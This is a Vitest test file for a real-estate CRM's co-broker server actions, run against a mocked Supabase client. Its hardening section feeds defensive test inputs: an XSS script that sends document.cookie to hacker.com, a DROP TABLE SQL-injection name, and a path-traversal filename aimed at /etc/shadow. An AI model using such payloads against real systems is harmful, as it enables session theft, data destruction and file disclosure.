import { describe, it, expect, vi, beforeEach } from 'vitest';
import { globalMockSupabase as mockSupabase } from '@/tests/mocks/supabase';

describe('Co-Brokers Module - Definitive Case', () => {
  let getCoBrokersAction: any;
  let createCoBrokerAction: any;
  let updateCoBrokerAction: any;
  let deleteCoBrokerAction: any;
  let restoreCoBrokerAction: any;
  let permanentlyDeleteCoBrokerAction: any;
  let getCoBrokerPerformanceAction: any;
  let addCoBrokerDocumentAction: any;
  let getCoBrokerDocumentsAction: any;
  let deleteCoBrokerDocumentAction: any;
  let bulkDeleteCoBrokersAction: any;
  let bulkRestoreCoBrokersAction: any;
  let bulkUpdateCoBrokerGroupAction: any;
  let getTrashCoBrokersAction: any;
  let getCoBrokerDealsAction: any;

  beforeEach(async () => {
    vi.resetModules();
    vi.clearAllMocks();
    mockSupabase.clear();

    (globalThis as any).__MOCK_SUPABASE__ = mockSupabase;

    vi.doMock('@/lib/authz', () => ({
      requireAuthContext: vi.fn(),
      AuthzError: class AuthzError extends Error {
        code: string;
        constructor(code: string, message?: string) {
          super(message || code);
          this.code = code;
          this.name = 'AuthzError';
        }
      }
    }));

    vi.doMock('@/lib/actions/system-config', () => ({
      getSystemConfig: vi.fn().mockResolvedValue({ 
        multi_tenant_enabled: true, 
        default_tenant_id: 'tenant-1' 
      }),
    }));

    vi.doMock('next/cache', () => ({
      revalidatePath: vi.fn(),
    }));

    vi.doMock('@/features/audit/actions', () => ({
       logActivityAction: vi.fn().mockResolvedValue({ success: true }),
    }));

    // 🛡️ RE-IMPORT Actions to respect the mocks
    const actions = await import('./actions');
    getCoBrokersAction = actions.getCoBrokersAction;
    createCoBrokerAction = actions.createCoBrokerAction;
    updateCoBrokerAction = actions.updateCoBrokerAction;
    deleteCoBrokerAction = actions.deleteCoBrokerAction;
    restoreCoBrokerAction = actions.restoreCoBrokerAction;
    permanentlyDeleteCoBrokerAction = actions.permanentlyDeleteCoBrokerAction;
    getCoBrokerPerformanceAction = actions.getCoBrokerPerformanceAction;
    addCoBrokerDocumentAction = actions.addCoBrokerDocumentAction;
    getCoBrokerDocumentsAction = actions.getCoBrokerDocumentsAction;
    deleteCoBrokerDocumentAction = actions.deleteCoBrokerDocumentAction;
    bulkDeleteCoBrokersAction = actions.bulkDeleteCoBrokersAction;
    bulkRestoreCoBrokersAction = actions.bulkRestoreCoBrokersAction;
    bulkUpdateCoBrokerGroupAction = actions.bulkUpdateCoBrokerGroupAction;
    getTrashCoBrokersAction = actions.getTrashCoBrokersAction;
    getCoBrokerDealsAction = actions.getCoBrokerDealsAction;

    // Default User Setup
    mockSupabase.auth.getUser.mockResolvedValue({ 
      data: { user: { id: 'u1' } }, 
      error: null 
    });

    const { requireAuthContext } = await import('@/lib/authz');
    (requireAuthContext as any).mockResolvedValue({
      supabase: mockSupabase,
      user: { id: 'u1' },
      role: 'AGENT',
      tenantId: 'tenant-1'
    });
  });

  describe('getCoBrokersAction', () => {
    it('should fetch and map co-brokers correctly', async () => {
      const mockIdentities = [
        {
          id: 'cb1',
          display_name: 'Alpha Broker',
          phone: '0811111111',
          email: 'alpha@test.com',
          is_active: true,
          social_links: { company_name: 'Alpha Corp', specialized_areas: ['Sukhumvit'] }
        },
        {
          id: 'cb2',
          display_name: 'Beta Broker',
          phone: '0822222222',
          email: 'beta@test.com',
          is_active: true,
          social_links: { company_name: 'Beta LLC', specialized_areas: ['Silom'] }
        }
      ];

      mockSupabase.mockTableResult('identities_v3', mockIdentities);

      const result = await getCoBrokersAction();
      expect(result.success).toBe(true);
      expect(result.data).toHaveLength(2);
      expect(result.data?.[0].company_name).toBe('Alpha Corp');
    });

    it('should filter co-brokers by search query', async () => {
      const mockIdentities = [
        {
          id: 'cb1',
          display_name: 'Alpha Broker',
          phone: '0811111111',
          email: 'alpha@test.com',
          social_links: { company_name: 'Alpha Corp' }
        },
        {
          id: 'cb2',
          display_name: 'Beta Broker',
          phone: '0822222222',
          email: 'beta@test.com',
          social_links: { company_name: 'Target Match' }
        }
      ];

      mockSupabase.mockTableResult('identities_v3', mockIdentities);

      const result = await getCoBrokersAction('Target');
      expect(result.success).toBe(true);
      expect(result.data).toHaveLength(1);
      expect(result.data?.[0].company_name).toBe('Target Match');
    });

    it('should filter co-brokers by specialized area', async () => {
      const mockIdentities = [
        {
          id: 'cb1',
          display_name: 'Alpha Broker',
          social_links: { specialized_areas: ['Sukhumvit'] }
        },
        {
          id: 'cb2',
          display_name: 'Beta Broker',
          social_links: { specialized_areas: ['Silom'] }
        }
      ];

      mockSupabase.mockTableResult('identities_v3', mockIdentities);

      const result = await getCoBrokersAction(undefined, 'Silom');
      expect(result.success).toBe(true);
      expect(result.data).toHaveLength(1);
      expect(result.data?.[0].id).toBe('cb2');
    });
  });

  describe('createCoBrokerAction', () => {
    it('should successfully create co-broker', async () => {
      mockSupabase.mockTableResult('profiles', { role: 'AGENT' });
      mockSupabase.mockTableResult('co_brokers', { id: 'cb1', name: 'Test' });

      const result = await createCoBrokerAction({
        name: 'Test Broker',
        phone: '0812345678',
        type: 'INDIVIDUAL',
        bank_code: 'KBANK',
        bank_account_no: '1234567890',
      } as any);

      expect(result.success).toBe(true);
      expect(mockSupabase.insert).toHaveBeenCalledWith(expect.objectContaining({
        social_links: expect.objectContaining({
          bank_code: 'KBANK',
          bank_account_no: '1234567890',
        })
      }));
    });
  });

  describe('updateCoBrokerAction', () => {
    it('should merge social_links and update successfully', async () => {
      mockSupabase
        .mockTableResult('identities_v3', { social_links: { company_name: 'Old Corp', rating: 4 } })
        .mockTableResult('identities_v3', { id: 'cb1', display_name: 'New Name', social_links: { company_name: 'New Corp', rating: 5 } });

      const result = await updateCoBrokerAction('cb1', {
        name: 'New Name',
        company_name: 'New Corp',
        rating: 5
      });

      expect(result.success).toBe(true);
      expect(result.data?.company_name).toBe('New Corp');
      expect(result.data?.rating).toBe(5);
    });

    it('should return error if existing co-broker not found', async () => {
      mockSupabase.mockTableResult('identities_v3', null);

      const result = await updateCoBrokerAction('cb_nonexistent', { name: 'Test' });
      expect(result.success).toBe(false);
      expect(result.error).toContain('ไม่พบข้อมูล');
    });
  });

  describe('deleteCoBrokerAction & restoreCoBrokerAction', () => {
    it('should soft delete co-broker', async () => {
      mockSupabase.mockTableResult('identities_v3', { success: true });

      const result = await deleteCoBrokerAction('cb1');
      expect(result.success).toBe(true);
      expect(mockSupabase.update).toHaveBeenCalledWith(expect.objectContaining({
        is_active: false,
        deleted_at: expect.any(String)
      }));
    });

    it('should restore soft deleted co-broker', async () => {
      mockSupabase.mockTableResult('identities_v3', { success: true });

      const result = await restoreCoBrokerAction('cb1');
      expect(result.success).toBe(true);
      expect(mockSupabase.update).toHaveBeenCalledWith(expect.objectContaining({
        is_active: true,
        deleted_at: null
      }));
    });
  });

  describe('permanentlyDeleteCoBrokerAction', () => {
    it('should allow admin users to delete', async () => {
      const { requireAuthContext } = await import('@/lib/authz');
      (requireAuthContext as any).mockResolvedValue({
        supabase: mockSupabase,
        user: { id: 'admin-1' },
        role: 'ADMIN',
        tenantId: 'tenant-1'
      });

      mockSupabase.mockTableResult('profiles', { role: 'ADMIN' });
      mockSupabase.mockSuccess([]);

      const result = await permanentlyDeleteCoBrokerAction('cb1');

      expect(result.success).toBe(true);
      expect(mockSupabase.delete).toHaveBeenCalled();
    });

    it('should block non-admin users', async () => {
      mockSupabase.mockTableResult('profiles', { role: 'AGENT' });

      const result = await permanentlyDeleteCoBrokerAction('cb1');

      expect(result.success).toBe(false);
      expect(result.error).toContain('สิทธิ์');
    });
  });

  describe('getCoBrokerPerformanceAction', () => {
    it('should calculate listings and earnings correctly', async () => {
      mockSupabase
        .mockTableResult('properties_core', [{ id: 'p1' }], 10) // total
        .mockTableResult('properties_core', [{ id: 'p1' }], 5)  // active
        .mockTableResult('properties_core', [{ id: 'p1' }], 2)  // sold
        .mockTableResult('crm_deal_commissions_v3', [
          { status: 'PAID', net_amount: 50000 },
          { status: 'READY_TO_PAY', net_amount: 25000 }
        ]);

      const result = await getCoBrokerPerformanceAction('cb1');
      expect(result.success).toBe(true);
      expect(result.stats?.totalListings).toBe(10);
      expect(result.stats?.activeListings).toBe(5);
      expect(result.stats?.soldListings).toBe(2);
      expect(result.stats?.realizedEarnings).toBe(50000);
      expect(result.stats?.accruedEarnings).toBe(25000);
      expect(result.stats?.conversionRate).toBe(20); // (2/10) * 100
    });
  });

  describe('Document Actions', () => {
    it('should add co-broker document', async () => {
      mockSupabase.mockTableResult('documents_v3', {
        id: 'doc1',
        owner_id: 'cb1',
        file_name: 'test.pdf',
        storage_path: 'https://storage/test.pdf',
        document_type: 'AGREEMENT',
        created_at: '2026-01-01T00:00:00Z'
      });

      const result = await addCoBrokerDocumentAction({
        co_broker_id: 'cb1',
        file_name: 'test.pdf',
        file_url: 'https://storage/test.pdf',
        file_type: 'AGREEMENT',
        file_size: 1024
      });

      expect(result.success).toBe(true);
      expect(result.data?.file_name).toBe('test.pdf');
    });

    it('should fetch co-broker documents', async () => {
      mockSupabase.mockTableResult('documents_v3', [
        { id: 'doc1', file_name: 'doc1.pdf' },
        { id: 'doc2', file_name: 'doc2.pdf' }
      ]);

      const result = await getCoBrokerDocumentsAction('cb1');
      expect(result.success).toBe(true);
      expect(result.data).toHaveLength(2);
    });

    it('should delete co-broker document', async () => {
      mockSupabase.mockTableResult('documents_v3', { success: true });

      const result = await deleteCoBrokerDocumentAction('doc1', 'cb1', 'doc1.pdf');
      expect(result.success).toBe(true);
      expect(mockSupabase.delete).toHaveBeenCalled();
    });
  });

  describe('Bulk Actions', () => {
    it('should bulk delete co-brokers for admin', async () => {
      const { requireAuthContext } = await import('@/lib/authz');
      (requireAuthContext as any).mockResolvedValue({
        supabase: mockSupabase,
        user: { id: 'admin-1' },
        role: 'ADMIN',
        tenantId: 'tenant-1'
      });

      mockSupabase.mockTableResult('identities_v3', { success: true });

      const result = await bulkDeleteCoBrokersAction(['cb1', 'cb2']);
      expect(result.success).toBe(true);
      expect(mockSupabase.update).toHaveBeenCalledWith(expect.objectContaining({
        is_active: false
      }));
    });

    it('should filter bulk delete by created_by for non-admin agents', async () => {
      const { requireAuthContext } = await import('@/lib/authz');
      (requireAuthContext as any).mockResolvedValue({
        supabase: mockSupabase,
        user: { id: 'agent-1' },
        role: 'AGENT',
        tenantId: 'tenant-1'
      });

      // Agent owns cb1 but NOT cb2
      mockSupabase
        .mockTableResult('identities_v3', [
          { id: 'cb1', social_links: { created_by: 'agent-1' } },
          { id: 'cb2', social_links: { created_by: 'other-user' } }
        ])
        .mockTableResult('identities_v3', { success: true });

      const result = await bulkDeleteCoBrokersAction(['cb1', 'cb2']);
      expect(result.success).toBe(true);
      expect(mockSupabase.in).toHaveBeenCalledWith('id', ['cb1']);
    });

    it('should bulk restore co-brokers', async () => {
      const { requireAuthContext } = await import('@/lib/authz');
      (requireAuthContext as any).mockResolvedValue({
        supabase: mockSupabase,
        user: { id: 'admin-1' },
        role: 'ADMIN',
        tenantId: 'tenant-1'
      });

      mockSupabase.mockTableResult('identities_v3', { success: true });

      const result = await bulkRestoreCoBrokersAction(['cb1']);
      expect(result.success).toBe(true);
      expect(mockSupabase.update).toHaveBeenCalledWith(expect.objectContaining({
        is_active: true,
        deleted_at: null
      }));
    });

    it('should bulk update co-broker group', async () => {
      const { requireAuthContext } = await import('@/lib/authz');
      (requireAuthContext as any).mockResolvedValue({
        supabase: mockSupabase,
        user: { id: 'admin-1' },
        role: 'ADMIN',
        tenantId: 'tenant-1'
      });

      mockSupabase
        .mockTableResult('identities_v3', [{ id: 'cb1', social_links: { broker_group: 'GENERAL' } }])
        .mockTableResult('identities_v3', { success: true });

      const result = await bulkUpdateCoBrokerGroupAction(['cb1'], 'VIP');
      expect(result.success).toBe(true);
      expect(mockSupabase.update).toHaveBeenCalledWith(expect.objectContaining({
        social_links: expect.objectContaining({ broker_group: 'VIP' })
      }));
    });
  });

  describe('getTrashCoBrokersAction', () => {
    it('should fetch soft deleted co-brokers', async () => {
      mockSupabase.mockTableResult('identities_v3', [
        { id: 'cb1', display_name: 'Trashed Broker', deleted_at: '2026-01-01T00:00:00Z', social_links: {} }
      ]);

      const result = await getTrashCoBrokersAction();
      expect(result.success).toBe(true);
      expect(result.data).toHaveLength(1);
      expect(result.data?.[0].name).toBe('Trashed Broker');
    });
  });

  describe('getCoBrokerDealsAction', () => {
    it('should fetch deals associated with co-broker', async () => {
      mockSupabase.mockTableResult('crm_deals_v3', [
        { id: 'd1', status: 'WON', commission_total: 100000, property: { title: 'Condo A', property_type: 'CONDO' } }
      ]);

      const result = await getCoBrokerDealsAction('cb1');
      expect(result.success).toBe(true);
      expect(result.data).toHaveLength(1);
      expect(result.data?.[0].commission_amount).toBe(100000);
    });
  });

  describe('Co-Brokers Module - Brutal Hardening & Error Injection (เทสโหดๆ แบบไม่อวย)', () => {
    describe('getCoBrokersAction - Brutal Injection & Outage', () => {
      it('should survive extreme SQL wildcard floods, XSS payloads, and massive strings without crashing', async () => {
        const maliciousQuery = '%%%%%%%%%%%%%%%%%%%% <script>fetch("http://hacker.com?cookie="+document.cookie)</script> ' + 'A'.repeat(5000);
        mockSupabase.mockTableResult('identities_v3', []);

        const result = await getCoBrokersAction(maliciousQuery);
        expect(result.success).toBe(true);
        expect(result.data).toEqual([]);
      });

      it('should gracefully contain catastrophic database disconnections and pool exhaustion', async () => {
        mockSupabase.mockTableError('identities_v3', new Error('PGRST500: Connection pool exhausted or database server unreachable'));

        const result = await getCoBrokersAction();
        expect(result.success).toBe(false);
        expect(result.error).toContain('PGRST500');
      });

      it('should robustly parse completely corrupted database rows and malformed JSONB without throwing TypeErrors', async () => {
        const corruptedIdentities = [
          { id: 'cb_corr1', display_name: null, social_links: 'INVALID_JSON_STRING' },
          { id: 'cb_corr2', display_name: undefined, social_links: null },
          { id: 'cb_corr3', display_name: 12345, social_links: ['array', 'instead', 'of', 'object'] },
          { id: 'cb_corr4', social_links: { company_name: { nested: 'invalid' }, rating: 'INVALID_RATING' } }
        ];

        mockSupabase.mockTableResult('identities_v3', corruptedIdentities);

        const result = await getCoBrokersAction();
        expect(result.success).toBe(true);
        expect(result.data).toHaveLength(4);
        expect(result.data?.[0].name).toBe('');
        expect(result.data?.[1].company_name).toBeNull();
        expect(result.data?.[2].specialized_areas).toEqual([]);
      });
    });

    describe('createCoBrokerAction - Extreme Boundaries & Constraint Failures', () => {
      it('should reject or handle extreme boundary values and SQL injection strings in form payloads', async () => {
        mockSupabase.mockTableResult('profiles', { role: 'AGENT' });

        const extremePayload = {
          name: "Robert'; DROP TABLE identities_v3;--",
          phone: '0812345678901234567890123456789012345678901234567890', // 50 digits
          type: 'INDIVIDUAL',
          rating: 999999, // Exceeds normal 1-5
          standard_commission_rate: -50, // Negative commission
        };

        // Zod schema should catch these extreme invalid values
        const result = await createCoBrokerAction(extremePayload as any);
        expect(result.success).toBe(false);
        expect(result.error).toBeDefined();
      });

      it('should gracefully propagate database unique constraint violations (duplicate phone/email)', async () => {
        mockSupabase.mockTableResult('profiles', { role: 'AGENT' });
        mockSupabase.mockTableError('identities_v3', new Error('23505: duplicate key value violates unique constraint "identities_phone_idx"'));

        const result = await createCoBrokerAction({
          name: 'Duplicate Broker',
          phone: '0812345678',
          type: 'INDIVIDUAL'
        } as any);

        expect(result.success).toBe(false);
        expect(result.error).toContain('23505');
      });
    });

    describe('updateCoBrokerAction - Concurrency & Hijacking Attempts', () => {
      it('should survive database serialization/locking failures during concurrent update race conditions', async () => {
        // Fetch succeeds, but update throws serialization failure
        mockSupabase
          .mockTableResult('identities_v3', { social_links: { company_name: 'Base Corp' } })
          .mockTableError('identities_v3', new Error('40001: serialization failure due to concurrent update'));

        const result = await updateCoBrokerAction('cb1', { company_name: 'Race Corp' });
        expect(result.success).toBe(false);
        expect(result.error).toContain('40001');
      });

      it('should handle updating with completely empty payloads without wiping existing social_links', async () => {
        mockSupabase
          .mockTableResult('identities_v3', { social_links: { company_name: 'Preserved Corp', rating: 5 } })
          .mockTableResult('identities_v3', { id: 'cb1', display_name: 'Same Name', social_links: { company_name: 'Preserved Corp', rating: 5 } });

        const result = await updateCoBrokerAction('cb1', {});
        expect(result.success).toBe(true);
        expect(result.data?.company_name).toBe('Preserved Corp');
        expect(result.data?.rating).toBe(5);
      });
    });

    describe('deleteCoBrokerAction & restoreCoBrokerAction - Idempotency & Isolation', () => {
      it('should maintain idempotency when soft deleting an already soft-deleted co-broker', async () => {
        mockSupabase.mockTableResult('identities_v3', { success: true });

        const result = await deleteCoBrokerAction('cb_already_deleted');
        expect(result.success).toBe(true);
      });

      it('should return clear error when attempting to restore a non-existent co-broker', async () => {
        mockSupabase.mockTableError('identities_v3', new Error('PGRST116: JSON object requested, multiple (or no) rows returned'));

        const result = await restoreCoBrokerAction('cb_ghost');
        expect(result.success).toBe(false);
        expect(result.error).toContain('PGRST116');
      });
    });

    describe('permanentlyDeleteCoBrokerAction - Foreign Key Constraint Violation', () => {
      it('should block deletion and return graceful error when active deals depend on the co-broker (FK constraint 23503)', async () => {
        const { requireAuthContext } = await import('@/lib/authz');
        (requireAuthContext as any).mockResolvedValue({
          supabase: mockSupabase,
          user: { id: 'admin-1' },
          role: 'ADMIN',
          tenantId: 'tenant-1'
        });

        mockSupabase.mockTableResult('profiles', { role: 'ADMIN' });
        mockSupabase.mockTableError('identities_v3', new Error('23503: update or delete on table violates foreign key constraint "crm_deals_co_broker_id_fkey"'));

        const result = await permanentlyDeleteCoBrokerAction('cb_with_deals');
        expect(result.success).toBe(false);
        expect(result.error).toContain('23503');
      });
    });

    describe('getCoBrokerPerformanceAction - Partial Outages & Division by Zero', () => {
      it('should catch partial database timeouts during concurrent Promise.all execution', async () => {
        mockSupabase
          .mockTableResult('properties_core', [{ id: 'p1' }], 10)
          .mockTableResult('properties_core', [{ id: 'p1' }], 5)
          .mockTableResult('properties_core', [{ id: 'p1' }], 2)
          .mockTableError('crm_deal_commissions_v3', new Error('PGRST504: Gateway Timeout during commission aggregation'));

        const result = await getCoBrokerPerformanceAction('cb1');
        expect(result.success).toBe(false);
        expect(result.error).toContain('PGRST504');
      });

      it('should maintain absolute mathematical stability against Division by Zero (0 total listings)', async () => {
        mockSupabase
          .mockTableResult('properties_core', [], 0) // 0 total
          .mockTableResult('properties_core', [], 0) // 0 active
          .mockTableResult('properties_core', [], 0) // 0 sold
          .mockTableResult('crm_deal_commissions_v3', []); // 0 comms

        const result = await getCoBrokerPerformanceAction('cb_zero');
        expect(result.success).toBe(true);
        expect(result.stats?.totalListings).toBe(0);
        expect(result.stats?.conversionRate).toBe(0); // Should not be NaN or Infinity
      });

      it('should safely fall back to 0 when calculating earnings from corrupted commission rows with malicious string amounts', async () => {
        mockSupabase
          .mockTableResult('properties_core', [{ id: 'p1' }], 1)
          .mockTableResult('properties_core', [{ id: 'p1' }], 1)
          .mockTableResult('properties_core', [{ id: 'p1' }], 1)
          .mockTableResult('crm_deal_commissions_v3', [
            { status: 'PAID', net_amount: 'DROP TABLE' as any },
            { status: 'PAID', net_amount: 'NaN' as any },
            { status: 'READY_TO_PAY', net_amount: 'INVALID' as any }
          ]);

        const result = await getCoBrokerPerformanceAction('cb_corrupt_comm');
        expect(result.success).toBe(true);
        expect(result.stats?.realizedEarnings).toBe(0);
        expect(result.stats?.accruedEarnings).toBe(0);
      });
    });

    describe('Document Actions - Path Traversal & Outages', () => {
      it('should survive path traversal filenames and negative file sizes gracefully', async () => {
        mockSupabase.mockTableResult('documents_v3', {
          id: 'doc_trav',
          owner_id: 'cb1',
          file_name: '../../../../etc/shadow',
          storage_path: 'https://storage/../../shadow',
          document_type: 'MALWARE',
          created_at: '2026-01-01T00:00:00Z'
        });

        const result = await addCoBrokerDocumentAction({
          co_broker_id: 'cb1',
          file_name: '../../../../etc/shadow',
          file_url: 'https://storage/../../shadow',
          file_type: 'MALWARE',
          file_size: -999999
        });

        expect(result.success).toBe(true);
        expect(result.data?.file_size).toBe(-999999);
      });

      it('should contain storage service deletion outages cleanly', async () => {
        mockSupabase.mockTableError('documents_v3', new Error('STORAGE_500: Internal Storage Outage'));

        const result = await deleteCoBrokerDocumentAction('doc1', 'cb1', 'doc1.pdf');
        expect(result.success).toBe(false);
        expect(result.error).toContain('STORAGE_500');
      });
    });

    describe('Bulk Actions - Massive Flood & Mixed Ownership RBAC Enforcement', () => {
      it('should survive massive bulk ID floods (5,000 IDs at once) without call stack errors', async () => {
        const massiveIds = Array.from({ length: 5000 }, (_, i) => `cb_${i}`);
        const { requireAuthContext } = await import('@/lib/authz');
        (requireAuthContext as any).mockResolvedValue({
          supabase: mockSupabase,
          user: { id: 'admin-1' },
          role: 'ADMIN',
          tenantId: 'tenant-1'
        });

        mockSupabase.mockTableResult('identities_v3', { success: true });

        const result = await bulkDeleteCoBrokersAction(massiveIds);
        expect(result.success).toBe(true);
        expect(mockSupabase.update).toHaveBeenCalled();
      });

      it('should strictly filter mixed ownership arrays for non-admin Agents, ignoring unowned IDs entirely', async () => {
        const { requireAuthContext } = await import('@/lib/authz');
        (requireAuthContext as any).mockResolvedValue({
          supabase: mockSupabase,
          user: { id: 'agent-123' },
          role: 'AGENT',
          tenantId: 'tenant-1'
        });

        // Mock DB returning 3 records: only cb_owned has created_by: 'agent-123'
        mockSupabase
          .mockTableResult('identities_v3', [
            { id: 'cb_owned', social_links: { created_by: 'agent-123' } },
            { id: 'cb_unowned_1', social_links: { created_by: 'other-agent' } },
            { id: 'cb_unowned_2', social_links: { created_by: 'admin-user' } }
          ])
          .mockTableResult('identities_v3', { success: true });

        const result = await bulkDeleteCoBrokersAction(['cb_owned', 'cb_unowned_1', 'cb_unowned_2']);
        expect(result.success).toBe(true);
        // Verify supabase.in was called STRICTLY with ['cb_owned']
        expect(mockSupabase.in).toHaveBeenCalledWith('id', ['cb_owned']);
      });
    });
  });
});
